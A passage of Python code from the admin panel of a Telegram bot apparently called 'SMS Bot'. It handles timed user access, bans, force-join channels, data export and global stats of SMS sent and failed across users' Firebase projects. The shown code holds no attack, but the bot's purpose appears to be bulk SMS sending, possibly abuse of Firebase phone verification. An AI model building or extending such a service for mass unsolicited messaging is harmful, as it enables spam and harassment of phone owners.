            exp = datetime.fromtimestamp(rem).strftime("%d/%m %H:%M") if rem else "∞"
            lines.append(f"  ⏱  <code>{k}</code>  exp:{exp}")
        await sedit(cq, "\n".join(lines) or "No users.",
            kb([("🔙  Back", "adm:menu")]))

    elif c == "adm:adduser":
        if not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
        await state.set_state(W.usr_add_id)
        await sedit(cq, "👤  <b>Add User</b>\n\nSend Telegram user ID:",
            kb([("❌  Cancel", "adm:menu")]))

    elif c.startswith("tacc:"):
        val = c.split(":")[1]
        fsmd = await state.get_data(); uid2 = fsmd.get("new_uid")
        if not uid2: await cq.answer("Session expired.", show_alert=True); return
        if val == "custom":
            await state.set_state(W.usr_add_exp)
            await sedit(cq, "📅  Send expiry (DD/MM/YYYY):",
                kb([("❌  Cancel", "adm:menu")])); return
        secs = int(val); exp = None if secs == 0 else time.time() + secs
        d2 = load()
        d2.setdefault("timed_users", {})[str(uid2)] = {
            "expires": exp, "added_by": uid, "added_at": int(time.time())}
        save(d2); await state.clear()
        label = "Permanent ♾" if secs == 0 else f"{secs//3600}h"
        await sedit(cq, f"✅  User <code>{uid2}</code> — <b>{label}</b>",
            adm_menu_kb(uid, d2))
        try:
            m2 = "♾ Permanent" if secs == 0 else f"⏱ {secs//3600}h"
            await cq.bot.send_message(uid2, f"✅ Access: <b>{m2}</b>\n/start",
                parse_mode="HTML")
        except: pass

    elif c == "adm:stats":
        if not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
        users = d.get("users", {})
        ts = tf = tfbs = 0
        for v in users.values():
            s = v.get("stats", {})
            ts += s.get("sent", 0); tf += s.get("failed", 0)
            tfbs += len(v.get("firebases", []))
        bar = pbar(ts, ts+tf, "gradient", 12) if ts+tf else "░"*12
        await sedit(cq,
            f"<pre>"
            f"╔══════════════════════════╗\n"
            f"║  📊  GLOBAL STATS        ║\n"
            f"╠══════════════════════════╣\n"
            f"║  {bar} {pct(ts,ts+tf):<4}║\n"
            f"╠══════════════════════════╣\n"
            f"║  👥  Users     : {len(users):<9}║\n"
            f"║  🔥  Firebases : {tfbs:<9}║\n"
            f"║  ✅  Sent      : {ts:<9}║\n"
            f"║  ❌  Failed    : {tf:<9}║\n"
            f"╚══════════════════════════╝"
            f"</pre>",
            kb([("🔙  Back", "adm:menu")]))

    elif c == "adm:free":
        if not is_owner(uid): await cq.answer("🚫 Owner only!", show_alert=True); return
        d["free"] = not d.get("free", False); save(d)
        await cq.answer(f"Free Mode: {'ON ✅' if d['free'] else 'OFF 🔴'}")
        await sedit(cq, "🛡  <b>Admin Panel</b>", adm_menu_kb(uid, d))

    elif c == "adm:addadmin":
        if not is_owner(uid): await cq.answer("🚫 Owner only!", show_alert=True); return
        await state.set_state(W.adm_add)
        await sedit(cq, "➕  <b>Add Admin</b>\n\nSend Telegram user ID:",
            kb([("❌  Cancel", "adm:menu")]))

    elif c == "adm:zip":
        if not is_owner(uid): await cq.answer("🚫 Owner only!", show_alert=True); return
        await cq.answer("📦 Preparing…")
        zdata = make_zip()
        fname = f"smsbot_{datetime.now().strftime('%Y%m%d_%H%M')}.zip"
        await cq.bot.send_document(uid, BufferedInputFile(zdata, filename=fname),
            caption=f"📦  <b>Export</b> <code>{fname}</code>", parse_mode="HTML")

    elif c == "adm:resetall":
        if not is_owner(uid): await cq.answer("🚫 Owner only!", show_alert=True); return
        await sedit(cq, "💥  <b>Reset ALL users?</b>",
            kb([("✅  Yes", "adm:resetall:yes"), ("❌  Cancel", "adm:menu")]))

    elif c == "adm:resetall:yes":
        if not is_owner(uid): await cq.answer("🚫", show_alert=True); return
        d2 = load(); d2["users"] = {}; d2["timed_users"] = {}; save(d2)
        await sedit(cq, "💥  <b>All data reset.</b>", adm_menu_kb(uid, load()))

    elif c == "ban:do":
        if not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
        await state.set_state(W.ban_id)
        await sedit(cq, "🚫  <b>Ban User</b>\n\nTelegram User ID bhejo:",
            kb([("❌  Cancel", "adm:menu")]))

    elif c == "unban:do":
        if not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
        banned = d.get("banned", [])
        if not banned:
            await cq.answer("✅ Koi banned nahi!", show_alert=True); return
        rows = [[(f"🔓 {bid}", f"unban:uid:{bid}")] for bid in banned]
        rows.append([("❌  Cancel", "adm:menu")])
        await sedit(cq, "✅  <b>Banned — Unban karo:</b>",
            InlineKeyboardMarkup(inline_keyboard=rows))

    elif c.startswith("unban:uid:"):
        if not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
        bid = int(c.split("unban:uid:", 1)[1])
        d2 = load()
        if bid in d2.get("banned", []): d2["banned"].remove(bid)
        save(d2)
        await cq.answer(f"✅ {bid} unban!", show_alert=True)
        await sedit(cq, f"✅  <b>Unban:</b> <code>{bid}</code>", adm_menu_kb(uid, d2))
        try: await cq.bot.send_message(bid, "✅ Ban hataya. /start", parse_mode="HTML")
        except: pass

    elif c == "fj:menu":
        if not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
        await sedit(cq, "📢  <b>Force Join Channels</b>", fj_menu_kb(uid, d))

    elif c == "fj:add":
        if not is_owner(uid): await cq.answer("🚫 Owner only!", show_alert=True); return
        await state.set_state(W.fj_add)
        await sedit(cq,
            "📢  <b>Add Force Join — Step 1/3</b>\n\n"
            "Channel/Group ka <b>link</b> bhejo:\n"
            "• <code>https://t.me/YourChannel</code>\n"
            "• <code>@username</code>",
            kb([("❌  Cancel", "fj:menu")]))

    elif c.startswith("fj:del:"):
        if not is_owner(uid): await cq.answer("🚫", show_alert=True); return
        cid_str = c.split("fj:del:", 1)[1]
        d2 = load()
        d2["force_join"] = [x for x in d2.get("force_join", []) if str(x["id"]) != cid_str]
        save(d2); await cq.answer("🗑 Removed.")
        await sedit(cq, "📢  <b>Force Join Channels</b>", fj_menu_kb(uid, d2))

    elif c == "<i>noop</i>": pass

    await cq.answer()

# ══════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════
async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me = await bot.get_me()
    log.info(f"✅ @{me.username} started ({_VERSION}) | by {_CREDITS}")
    try:
        await bot.send_message(OWNER_ID,
            f"🚀 <b>SMS Bot {_VERSION} Online</b>\n"
            f"@{me.username}\n"
            f"<i>Left Coder: {_CREDITS}</i>\n"
            f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>",
            parse_mode="HTML")
    except Exception as e: log.warning(f"Owner notify: {e}")
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())
